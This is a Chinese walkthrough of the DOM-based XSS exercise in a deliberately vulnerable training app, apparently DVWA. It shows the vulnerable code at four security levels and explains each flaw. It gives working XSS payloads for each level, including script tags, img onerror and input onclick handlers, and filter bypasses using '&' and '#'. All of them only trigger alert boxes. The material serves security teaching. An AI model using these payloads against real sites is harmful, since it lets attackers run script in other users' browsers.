@@ -1,0 +1,110 @@
+# 链接(URL)：https://www.wuyini.cn/672.html
+
+XSS (DOM) DOM型跨站脚本
+Low
+Html
+
+<div class="vulnerable_code_area">
+ 
+         <p>Please choose a language:</p>
+ 
+        <form name="XSS" method="GET">
+            <select name="default">
+                <script>
+                    if (document.location.href.indexOf("default=") >= 0) {
+                        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+                        document.write("<option value='" + lang + "'>" + $decodeURI(lang) + "</option>");
+                        document.write("<option value='' disabled='disabled'>----</option>");
+                    }
+ 
+                    document.write("<option value='English'>English</option>");
+                    document.write("<option value='French'>French</option>");
+                    document.write("<option value='Spanish'>Spanish</option>");
+                    document.write("<option value='German'>German</option>");
+                </script>
+            </select>
+            <input type="submit" value="Select" />
+        </form>
+</div>
+DOM XSS 是通过修改页面的 DOM 节点形成的 XSS。首先通过选择语言后然后往页面中创建了新的 DOM 节点：Html
+
+document.write("<option value='" + lang + "'>" + $decodeURI(lang) + "</option>");
+document.write("<option value='' disabled='disabled'>----</option>");
+这里的lang变量通过document.location.href来获取到，并且没有任何过滤就直接URL解码后输出在了option标签中，以下payload在Firefox Developer Edition 56.0b9版本的浏览器测试成功:Javascript
+
+?default=English <script>alert('XSS')</script>
+Medium
+Php
+
+<?php
+ 
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+    $default = $_GET['default'];
+ 
+    # Do not allow script tags
+    if (stripos ($default, "<script") !== false) {
+        header ("location: ?default=English");
+        exit;
+    }
+}
+ 
+?>
+对default变量进行了过滤，通过stripos() 函数查找<script字符串在default变量值中第一次出现的位置（不区分大小写），如果匹配搭配的话手动通过location将URL后面的参数修正为?default=English，同样这里可以通过其他的标签搭配事件来达到弹窗的效果。
+
+闭合</option>和</select>，然后使用img标签通过事件来弹窗
+
+payload1Javascript
+
+?default=English</option></select><img src=x onerror=alert('XSS')>
+直接利用input的事件来弹窗
+
+payload2
+
+?default=English<input onclick=alert('XSS') />
+High
+Php
+
+<?php
+ 
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+ 
+    # White list the allowable languages
+    switch ($_GET['default']) {
+        case "French":
+        case "English":
+        case "German":
+        case "Spanish":
+            # ok
+            break;
+        default:
+            header ("location: ?default=English");
+            exit;
+    }
+}
+ 
+?>
+使用了白名单模式，如果default的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为:?default=English ，这里只是对 default 的变量进行了过滤。
+
+可以使用&连接另一个自定义变量来Bypass
+
+payload1
+
+?default=English&a=</option></select><img src=x onerror=alert('XSS')>
+?default=English&a=<input onclick=alert('XSS') />
+也可以使用#来Bypass
+
+payload2
+
+?default=English#</option></select><img src=x onerror=alert('XSS')>
+?default=English#<input onclick=alert('XSS') />
+Impossible
+Php
+
+# For the impossible level, don't decode the querystring
+$decodeURI = "decodeURI";
+if ($vulnerabilityFile == 'impossible.php') {
+    $decodeURI = "";
+}
+Impossible 级别直接不对我们的输入参数进行 URL 解码了，这样会导致标签失效，从而无法XSS
